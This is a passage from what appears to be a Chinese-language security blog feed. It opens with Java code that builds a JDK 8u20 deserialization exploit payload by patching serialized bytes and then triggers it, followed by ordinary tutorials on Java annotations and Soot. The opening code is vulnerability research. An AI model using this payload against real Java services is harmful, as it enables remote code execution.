class="keyword">true</span>);</span><br><span class="line">        serializable.set(bcs, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//修改bcs父类的beanContextChildPeer属性设置为bcs自己</span></span><br><span class="line">        Field beanContextChildPeer = cc.getSuperclass().getDeclaredField(<span class="string">"beanContextChildPeer"</span>);</span><br><span class="line">        beanContextChildPeer.set(bcs, bcs);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        set.add(bcs); <span class="comment">// 先加入BeanContextSupport bcs</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//开始写序列化</span></span><br><span class="line">        ByteArrayOutputStream baous = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baous);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(set);</span><br><span class="line">        oos.writeObject(invocationHandler);</span><br><span class="line">        oos.writeObject(tmpl);</span><br><span class="line">        oos.writeObject(proxy);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baous.toByteArray();</span><br><span class="line">        System.out.println(<span class="string">"[+] Modify HashSet size from  1 to 3"</span>);</span><br><span class="line">        bytes[<span class="number">89</span>] = <span class="number">3</span>; <span class="comment">//修改hashset的长度（元素个数）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//调整 TC_ENDBLOCKDATA 标记的位置</span></span><br><span class="line">        <span class="comment">//0x73 = 115, 0x78 = 120</span></span><br><span class="line">        <span class="comment">//0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">0</span> &amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">4</span>] == <span class="number">120</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">120</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">115</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] Delete TC_ENDBLOCKDATA at the end of HashSet"</span>);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i + <span class="number">5</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//将 serializable 的值修改为 1</span></span><br><span class="line">        <span class="comment">//0x73 = 115, 0x78 = 120</span></span><br><span class="line">        <span class="comment">//0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">120</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">1</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">4</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">7</span>] == <span class="number">115</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] Modify BeanContextSupport.serializable from 0 to 1"</span>);</span><br><span class="line">                bytes[i+<span class="number">6</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         TC_BLOCKDATA - 0x77</span></span><br><span class="line"><span class="comment">         Length - 4 - 0x04</span></span><br><span class="line"><span class="comment">         Contents - 0x00000000</span></span><br><span class="line"><span class="comment">         TC_ENDBLOCKDATA - 0x78</span></span><br><span class="line"><span class="comment">         **/</span></span><br><span class="line">        <span class="comment">//把这部分内容先删除，再附加到 AnnotationInvocationHandler 之后</span></span><br><span class="line">        <span class="comment">//目的是让 AnnotationInvocationHandler 变成 BeanContextSupport 的数据流</span></span><br><span class="line">        <span class="comment">//0x77 = 119, 0x78 = 120</span></span><br><span class="line">        <span class="comment">//0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">119</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">4</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">4</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">120</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] Delete TC_BLOCKDATA...int...TC_BLOCKDATA at the End of BeanContextSupport"</span>);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                bytes = Util.deleteAt(bytes, i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">              serialVersionUID - 0x00 00 00 00 00 00 00 00</span></span><br><span class="line"><span class="comment">                  newHandle 0x00 7e 00 28</span></span><br><span class="line"><span class="comment">                  classDescFlags - 0x00 -</span></span><br><span class="line"><span class="comment">                  fieldCount - 0 - 0x00 00</span></span><br><span class="line"><span class="comment">                  classAnnotations</span></span><br><span class="line"><span class="comment">                    TC_ENDBLOCKDATA - 0x78</span></span><br><span class="line"><span class="comment">                  superClassDesc</span></span><br><span class="line"><span class="comment">                    TC_NULL - 0x70</span></span><br><span class="line"><span class="comment">              newHandle 0x00 7e 00 29</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//0x78 = 120, 0x70 = 112</span></span><br><span class="line">        <span class="comment">//0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i + <span class="number">4</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">7</span>] == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">8</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">9</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">10</span>] == <span class="number">0</span> &amp;&amp; bytes[i+<span class="number">11</span>] == <span class="number">120</span> &amp;&amp;</span><br><span class="line">                    bytes[i+<span class="number">12</span>] == <span class="number">112</span>)&#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] Add back previous delte TC_BLOCKDATA...int...TC_BLOCKDATA after invocationHandler"</span>);</span><br><span class="line">                i = i + <span class="number">13</span>;</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x77</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x04</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x00</span>);</span><br><span class="line">                bytes = Util.addAtIndex(bytes, i++, (<span class="keyword">byte</span>) <span class="number">0x78</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将 sun.reflect.annotation.AnnotationInvocationHandler 的 classDescFlags 由 SC_SERIALIZABLE 修改为 SC_SERIALIZABLE | SC_WRITE_METHOD</span></span><br><span class="line">        <span class="comment">//这一步其实不是通过理论推算出来的，是通过debug 以及查看 pwntester的 poc 发现需要这么改</span></span><br><span class="line">        <span class="comment">//原因是如果不设置 SC_WRITE_METHOD 标志的话 defaultDataEnd = true，导致 BeanContextSupport -&gt; deserialize(ois, bcmListeners = new ArrayList(1))</span></span><br><span class="line">        <span class="comment">// -&gt; count = ois.readInt(); 报错，无法完成整个反序列化流程</span></span><br><span class="line">        <span class="comment">// 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了</span></span><br><span class="line">        <span class="comment">// 标记： 7375 6e2e 7265 666c 6563 --&gt; sun.reflect...</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(bytes[i] == <span class="number">115</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">117</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">110</span> &amp;&amp; bytes[i+<span class="number">3</span>] == <span class="number">46</span> &amp;&amp;</span><br><span class="line">                    bytes[i + <span class="number">4</span>] == <span class="number">114</span> &amp;&amp; bytes[i+<span class="number">5</span>] == <span class="number">101</span> &amp;&amp; bytes[i+<span class="number">6</span>] == <span class="number">102</span> &amp;&amp; bytes[i+<span class="number">7</span>] == <span class="number">108</span> )&#123;</span><br><span class="line">                System.out.println(<span class="string">"[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -&gt; classDescFlags from SC_SERIALIZABLE to "</span> +</span><br><span class="line">                        <span class="string">"SC_SERIALIZABLE | SC_WRITE_METHOD"</span>);</span><br><span class="line">                i = i + <span class="number">58</span>;</span><br><span class="line">                bytes[i] = <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加回之前删除的 TC_BLOCKDATA，表明 HashSet 到此结束</span></span><br><span class="line">        System.out.println(<span class="string">"[+] Add TC_BLOCKDATA at end"</span>);</span><br><span class="line">        bytes = Util.addAtLast(bytes, (<span class="keyword">byte</span>) <span class="number">0x78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream fous = <span class="keyword">new</span> FileOutputStream(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk8u20.ser"</span>);</span><br><span class="line">        fous.write(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk8u20.ser"</span>));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/201762" target="_blank" rel="noopener">lalajun</a>/<a href="https://www.anquanke.com/post/id/82934" target="_blank" rel="noopener">高级利用</a>/<a href="https://www.cnblogs.com/litlife/p/12571787.html#transformedmap" target="_blank" rel="noopener">lazymap</a>/<a href="https://xz.aliyun.com/t/3847#toc-8" target="_blank" rel="noopener">浅析Java序列化和反序列化</a>/</p><p><a href="https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e8-%e8%a7%a3%e5%af%86-ysoserial-commonscollections2-pop-chains/" target="_blank" rel="noopener">javassist</a>/<a href="https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e8-%e8%a7%a3%e5%af%86-ysoserial-commonscollections2-pop-chains/" target="_blank" rel="noopener">B4llo0n</a>/<a href="https://www.anquanke.com/post/id/232592" target="_blank" rel="noopener">anquanke</a>/<a href="https://xz.aliyun.com/t/1756#toc-3" target="_blank" rel="noopener">aliyun</a>/<a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">平安</a>/<a href="https://paper.seebug.org/1242/#commonscollections-2" target="_blank" rel="noopener">seebug</a></p><p><a href="https://www.anquanke.com/post/id/190468#h3-6" target="_blank" rel="noopener">wh1t3p1g</a>/<a href="https://www.anquanke.com/post/id/240040" target="_blank" rel="noopener">6&amp;7</a>/<a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/" target="_blank" rel="noopener">b1ngz</a>/<a href="https://xz.aliyun.com/t/6884" target="_blank" rel="noopener">7u21</a>/<a href="https://www.anquanke.com/post/id/207762" target="_blank" rel="noopener">8u20</a>/<a href="https://blog.csdn.net/silentbalanceyh/article/details/8183849" target="_blank" rel="noopener">序列化规范</a>/<a href="https://xz.aliyun.com/t/9566" target="_blank" rel="noopener">8u20</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;温故而知新。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;站在巨人们的肩膀上，总结Java反序列化漏洞利用链，会持续更新。&lt;/p&gt;
&lt;p&gt;同步项目：&lt;a href=&quot;https://github.com/fynch3r/Gadgets&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Gadgets&lt;/a&gt;     &lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://fynch3r.github.io/categories/Java/"/>
    
    
      <category term="漏洞分析" scheme="https://fynch3r.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Java注解</title>
    <link href="https://fynch3r.github.io/Java%E6%B3%A8%E8%A7%A3/"/>
    <id>https://fynch3r.github.io/Java%E6%B3%A8%E8%A7%A3/</id>
    <published>2021-05-11T08:06:31.000Z</published>
    <updated>2021-11-09T08:13:28.981Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>事不凝滞,理贵变通。</p></blockquote><p>写框架离不开Java注解，今天来总结一下。</p><a id="more"></a><h1 id="Java元注解"><a href="#Java元注解" class="headerlink" title="Java元注解"></a>Java元注解</h1><blockquote><p>四个：@Retention @Target @Docuement @Inherited</p></blockquote><p>元注解，用来标注注解的注解。</p><p><strong>@Retention</strong>：注解的保留位置　　　　　　　　　</p><p>​    @Retention(RetentionPolicy.SOURCE)   //注解仅存在于源码中，在编译期就被丢掉了，不会被class包含。</p><p>​    @Retention(RetentionPolicy.CLASS)     // 不会加载进JVM，注解会在class字节码文件中存在，但运行时无法获得。</p><p>​    @Retention(RetentionPolicy.RUNTIME)  // 注解会在class字节码文件中存在，在运行时可以通过反射获取到。</p><p><strong>这里如果@Retention未标注，默认是CLASS阶段</strong>。</p><p>通常我们自定义的都是RUNTIME阶段，一定要标注。</p><p><strong>@Target</strong>：注解的作用目标</p><p>​    @Target(ElementType.TYPE)   //接口、类、枚举</p><p>​    @Target(ElementType.FIELD) //字段、枚举的常量</p><p>​    @Target(ElementType.METHOD) //方法</p><p>​    @Target(ElementType.PARAMETER) //方法参数</p><p>​    @Target(ElementType.CONSTRUCTOR)  //构造函数</p><p>​    @Target(ElementType.LOCAL_VARIABLE)//局部变量</p><p>​    @Target(ElementType.ANNOTATION_TYPE)//注解</p><p>​    @Target(ElementType.PACKAGE) ///包   </p><p><strong>@Document</strong>：说明该注解将被包含在javadoc中</p><p><strong>@Inherited</strong>：说明子类可以继承父类中的该注解。</p><p>​    @Inherited仅针对@Target(ElementType.TYPE)类型的注解有效，并且仅针对类的继承，对接口的继承无效。</p><h1 id="Java注解的使用"><a href="#Java注解的使用" class="headerlink" title="Java注解的使用"></a>Java注解的使用</h1><blockquote><p>注解可以附加在程序元素（ 包、类、构造器、方法、成员变量、参数、局域变量 ）上面，为其添加额外的辅助信息，可以通过反射机制访问这些数据。</p></blockquote><p>写个小demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.METHOD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Report &#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">id</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">type</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function">String <span class="title">level</span><span class="params">()</span> <span class="keyword">default</span> "info"</span>;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本注解仅针对method，作用在runtime阶段。</p><p>使用该注解的方式应为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Report</span>(id=xxx,type=xxx,level=xxx,value=xxx)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMethod</span><span class="params">(...)</span></span></span><br></pre></td></tr></table></figure><p>default的意义在于如果使用注解的时候未给参数赋值，可以采用default预先写好的值。</p><p>如果注解想在多个target使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(&#123;</span><br><span class="line">        ElementType.METHOD,</span><br><span class="line">        ElementType.TYPE</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Report &#123;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">id</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">type</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function">String <span class="title">level</span><span class="params">()</span> <span class="keyword">default</span> "info"</span>;</span><br><span class="line">    <span class="function">String <span class="title">value</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h1><p>必须要写：</p><ul><li>@Target</li><li>@Retention</li></ul><p>可定义多个参数和默认值，核心参数使用value名称。</p><p>应当设置@Retention(RetentionPolicy.RUNTIME)便于运行期读取该Annotation。</p><p>Java提供的使用反射API读取<code>Annotation</code>的方法包括：</p><p>判断某个注解是否存在于<code>Class</code>、<code>Field</code>、<code>Method</code>或<code>Constructor</code>：</p><ul><li><code>Class.isAnnotationPresent(Class)</code></li><li><code>Field.isAnnotationPresent(Class)</code></li><li><code>Method.isAnnotationPresent(Class)</code></li><li><code>Constructor.isAnnotationPresent(Class)</code></li></ul><p>例如：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断@Report是否存在于Person类:</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Person</span>.</span></span><span class="keyword">class</span>.is<span class="constructor">AnnotationPresent(Report.<span class="params">class</span>)</span>;</span><br></pre></td></tr></table></figure><p>使用反射API读取Annotation：</p><ul><li><code>Class.getAnnotation(Class)</code></li><li><code>Field.getAnnotation(Class)</code></li><li><code>Method.getAnnotation(Class)</code></li><li><code>Constructor.getAnnotation(Class)</code></li></ul><p>例如：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Person定义的@Report注解:</span></span><br><span class="line"><span class="keyword">Report</span> <span class="keyword">report</span> = Person.<span class="keyword">class</span>.getAnnotation(<span class="keyword">Report</span>.<span class="keyword">class</span>);</span><br><span class="line">int <span class="keyword">type</span> = <span class="keyword">report</span>.<span class="keyword">type</span>();</span><br><span class="line">String level = <span class="keyword">report</span>.level();</span><br></pre></td></tr></table></figure><p>demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.FIELD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Range &#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">()</span> <span class="keyword">default</span> 255</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>某个JavaBean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Range</span>(min=<span class="number">1</span>, max=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Range</span>(max=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">public</span> String city;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写一个<code>Person</code>实例的检查方法，它可以检查<code>Person</code>实例的<code>String</code>字段长度是否满足<code>@Range</code>的定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">(Person person)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">  <span class="comment">// 遍历所有Field:</span></span><br><span class="line">    <span class="keyword">for</span> (Field field : person.getClass().getFields()) &#123;</span><br><span class="line">        <span class="comment">// 获取Field定义的@Range:</span></span><br><span class="line">        Range range = field.getAnnotation(Range<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 如果@Range存在:</span></span><br><span class="line">        <span class="keyword">if</span> (range != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取Field的值:</span></span><br><span class="line">            Object value = field.get(person);</span><br><span class="line">            <span class="comment">// 如果值是String:</span></span><br><span class="line">            <span class="keyword">if</span> (value <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                String s = (String) value;</span><br><span class="line">                <span class="comment">// 判断值是否满足@Range的min/max:</span></span><br><span class="line">                <span class="keyword">if</span> (s.length() &lt; range.min() || s.length() &gt; range.max()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Invalid field: "</span> + field.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1265102803921888" target="_blank" rel="noopener">liaoxuefeng</a></p><p><a href="https://www.cnblogs.com/peida/archive/2013/04/24/3036689.html" target="_blank" rel="noopener">竹子</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;事不凝滞,理贵变通。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;写框架离不开Java注解，今天来总结一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://fynch3r.github.io/categories/Java/"/>
    
    
      <category term="Java基础" scheme="https://fynch3r.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>使用soot创建类文件</title>
    <link href="https://fynch3r.github.io/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/"/>
    <id>https://fynch3r.github.io/%E4%BD%BF%E7%94%A8soot%E5%88%9B%E5%BB%BA%E7%B1%BB%E6%96%87%E4%BB%B6/</id>
    <published>2021-03-25T02:19:08.000Z</published>
    <updated>2021-03-25T02:26:43.635Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>鱼沉雁杳天涯路，始信人间别离苦。</p></blockquote><p>老博客归档。</p><a id="more"></a><h1 id="如何创建一个类"><a href="#如何创建一个类" class="headerlink" title="如何创建一个类"></a>如何创建一个类</h1><p>之前看ASM创建一个类，很实费劲，需要直接写字节码口令，这次尝试用Soot API写一下最简单的Hello World。</p><h2 id="加载java-lang-Object和库类"><a href="#加载java-lang-Object和库类" class="headerlink" title="加载java.lang.Object和库类"></a>加载<code>java.lang.Object</code>和库类</h2><p>我们知道所有对象的父类都是Object类，那么上来第一步，先添加两个依赖类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建两个依赖类</span></span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.Object"</span>);</span><br><span class="line">        Scene.v().loadClassAndSupport(<span class="string">"java.lang.System"</span>);</span><br></pre></td></tr></table></figure><p>这里，教程上说，当你loadClassAndSupport时候，相关类的所有内容都会被加载进来，一招拿下！</p><h2 id="创建一个新SootClass对象"><a href="#创建一个新SootClass对象" class="headerlink" title="创建一个新SootClass对象"></a>创建一个新<code>SootClass</code>对象</h2><p>接下来创建我们创建的这个类就叫做HelloWorld。在Soot里面需要用<code>SootClass</code>来封装，并将其父类设置为<code>java.lang.Object</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sClass = <span class="keyword">new</span> SootClass(<span class="string">"HelloWorld"</span>, Modifier.PUBLIC);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sClass.setSuperclass(Scene.v().getSootClass(<span class="string">"java.lang.Object"</span>));</span><br></pre></td></tr></table></figure><p>这会将新创建的类的父类设置为的<code>SootClass</code>对象<code>java.lang.Object</code>。注意使用工具的方法<code>getSootClass</code>上<code>Scene</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 